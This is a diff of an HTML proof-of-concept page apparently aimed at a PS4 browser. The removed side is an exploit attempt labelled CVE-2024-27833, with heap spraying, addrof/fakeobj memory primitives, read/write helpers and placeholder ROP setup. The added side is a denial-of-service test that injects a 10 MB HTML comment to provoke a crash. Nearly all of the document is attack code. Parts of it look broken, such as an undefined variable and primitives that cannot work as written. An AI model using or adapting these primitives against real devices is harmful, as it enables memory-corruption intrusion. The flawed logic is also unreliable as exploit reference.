@@ -3,154 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="util.js"></script>
-    <script src="int64.js"></script>
-    <title>PS4 CVE-2024-27833 PoC with Debug</title>
+    <title>HTMLTokenizer Long Comment PoC</title>
     <style>
-        #console { white-space: pre; font-family: monospace; }
+        #console { white-space: pre; font-family: monospace; height: 300px; overflow-y: scroll; }
     </style>
 </head>
 <body>
     <p id="status">Initializing...</p>
     <div id="console"></div>
     <script>
-function foo(a, b, c) {
-    let x = a | 0;
-    let y = b | 0;
-    let z = c & 15;
-    z = (x << y) ^ (x << (y & 0x10ff));
-    let r = z ^ 0xf01;
-    let s = z ^ 0xf1f;
-    return (((a >>> r) << s) >> s);
-}
-
-// Reduced iterations to avoid crash
-let LEN = 5000;
-let res = 0;
-res = foo((LEN & 127), 456, 789);
-
-if (res != -1) {
-    throw "Wrong result: " + res;
-}
-
-for (let i = 0; i <= LEN; i++) {
-    res = foo((i & 127), 456, 789);
-}
-
-if (res != -1) {
-    throw "Wrong result: " + res;
-}
-
-// Enhanced heap spray for stability
-let sprayArray = [];
-for (let i = 0; i < 400; i++) {
-    let sprayObj = { data: 0xcafebeef, pos: i, buffer: new ArrayBuffer(8) };
-    sprayArray.push(sprayObj);
-}
-for (let i = 0; i < 200; i++) {
-    let extraObj = { x: 1.1, y: 2.2, z: 3.3 };
-    sprayArray.push(extraObj);
-}
-
 function logDebug(message) {
     let timestamp = new Date().toISOString();
     let debugMsg = `[${timestamp}] ${message}\n`;
     console.log(debugMsg);
-    document.getElementById("console").innerHTML += debugMsg;
+    let consoleDiv = document.getElementById("console");
+    consoleDiv.innerHTML += debugMsg;
+    consoleDiv.scrollTop = consoleDiv.scrollHeight; // Auto-scroll to latest message
+}
+
+function generateLongComment() {
+    logDebug("Step 1: Generating long comment...");
+    let length = 10 * 1024 * 1024; // 10 MB of random characters
+    let commentContent = '';
+    for (let i = 0; i < length; i++) {
+        commentContent += String.fromCharCode(65 + (Math.random() * 26)); // Random A-Z
+    }
+    return `<!-- ${commentContent} -->`;
 }
 
 function pwn() {
-    logDebug("Starting exploit process...");
+    logDebug("Starting PoC process...");
 
-    let success = false;
     try {
-        logDebug("Step 1: Calling foo with overflow test (0x7fffffff, 0x10ff, 0xf)...");
-        let testResult = foo(0x7fffffff, 0x10ff, 0xf);
-        logDebug(`Step 2: foo result: ${testResult}`);
-        if (testResult !== -1 || isNaN(testResult) || testResult === Infinity) {
-            success = true;
-            logDebug("Step 3: Overflow detected successfully.");
+        logDebug("Step 2: Injecting long comment into DOM...");
+        let longComment = generateLongComment();
+        document.body.innerHTML += longComment; // Inject the comment
+
+        logDebug("Step 3: Checking if DOM processed the comment...");
+        let bodyContent = document.body.innerHTML.length;
+        logDebug(`Step 4: DOM content length after injection: ${bodyContent} bytes`);
+
+        if (bodyContent < length / 2) { // Arbitrary check for failure
+            logDebug("Step 5: DOM failed to process the full comment.");
+            throw new Error("Partial processing detected");
         }
+
+        logDebug("Step 6: Comment processed successfully (no immediate crash).");
+        document.getElementById("status").innerHTML = "Success - Comment Processed!";
     } catch (e) {
-        success = true;
-        logDebug(`Step 3: Caught exception (possible crash): ${e.message}`);
-    }
-
-    if (!success) {
-        logDebug("Step 4: Exploit failed - no overflow or crash detected.");
+        logDebug(`Step 5: Error or crash detected: ${e.message}`);
         document.getElementById("status").innerHTML = "Exploit failed!";
-        document.getElementById("console").innerHTML += "No overflow or crash detected.\n";
-        location.reload();
+        document.getElementById("console").innerHTML += "Possible buffer overflow or DoS.\n";
+        location.reload(); // Reload on failure
         return;
     }
 
-    logDebug("Step 5: Setting up memory corruption...");
-    document.getElementById("console").innerHTML = ""; // Clear console
-
-    let controlObj = { value: 0, buffer: new ArrayBuffer(8) };
-    sprayArray[0] = controlObj;
-    logDebug("Step 6: Control object assigned to sprayArray[0].");
-
-    function addrof(o) {
-        controlObj.value = o;
-        let addr = Int64.fromDouble(new Uint32Array(controlObj.buffer)[0] || 0);
-        if (addr.toString().startsWith('-')) addr = addr.add(Int64.fromNumber(0x1000000000000));
-        return addr;
-    }
-
-    function fakeobj(addr) {
-        new Uint32Array(controlObj.buffer)[0] = addr.low32();
-        return controlObj.value;
-    }
-
-    logDebug("Step 7: Creating addrof and fakeobj primitives...");
-    let sample = BigInt(addrof({ x: 0xdeadc0de }).toString());
-    logDebug(`Step 8: Sample address: 0x${sample.toString(16)}`);
-    if (sample >= 0x200000000n || sample < 0x100000000n) {
-        logDebug("Step 9: Invalid address detected.");
-        document.getElementById("status").innerHTML = "Exploit failed!";
-        document.getElementById("console").innerHTML += "Invalid address: 0x" + sample.toString(16) + "\n";
-        location.reload();
-        return;
-    }
-
-    document.getElementById("status").innerHTML = "Success - Memory Control Achieved!";
-    logDebug("Step 10: Success - Memory control achieved!");
-
-    // Test fakeobj
-    logDebug("Step 11: Testing fakeobj...");
-    let testObj = { y: 0x12345678 };
-    let addr = addrof(testObj);
-    let fake = fakeobj(addr);
-    if (fake.y === testObj.y) {
-        logDebug("Step 12: fakeobj test passed.");
-    } else {
-        logDebug("Step 12: fakeobj test failed.");
-    }
-
-    // Basic read/write with buffer
-    logDebug("Step 13: Testing read/write primitives...");
-    function read(addr) {
-        let fake = fakeobj(addr);
-        return new Uint32Array(fake.buffer)[0] || 0;
-    }
-    function write(addr, value) {
-        let fake = fakeobj(addr);
-        new Uint32Array(fake.buffer)[0] = value;
-    }
-    let readTest = read(addrof({ z: 0x9abc }));
-    logDebug(`Step 14: Read test result: 0x${(readTest !== undefined ? readTest.toString(16) : "undefined")}`);
-    write(addrof({ z: 0x9abc }), 0xabcdef);
-    logDebug(`Step 15: Write test result: 0x${(testObj.z !== undefined ? testObj.z.toString(16) : "undefined")}`);
-
-    // Step toward RCE: Prepare for ROP
-    logDebug("Step 16: Attempting ROP setup...");
-    let ropBuffer = new ArrayBuffer(0x1000);
-    let ropView = new Uint32Array(ropBuffer);
-    ropView[0] = 0xdeadbeef; // Placeholder gadget address
-    ropView[1] = 0x12345678; // Placeholder argument
-    write(addrof({ rop: ropBuffer }), ropView[0]);
-    logDebug(`Step 17: ROP buffer written at: 0x${addrof({ rop: ropBuffer }).toString(16)}`);
+    logDebug("Step 7: PoC completed - check for memory issues or crash.");
 }
 
 // تنفيذ الاستغلال تلقائيًا عند التحميل
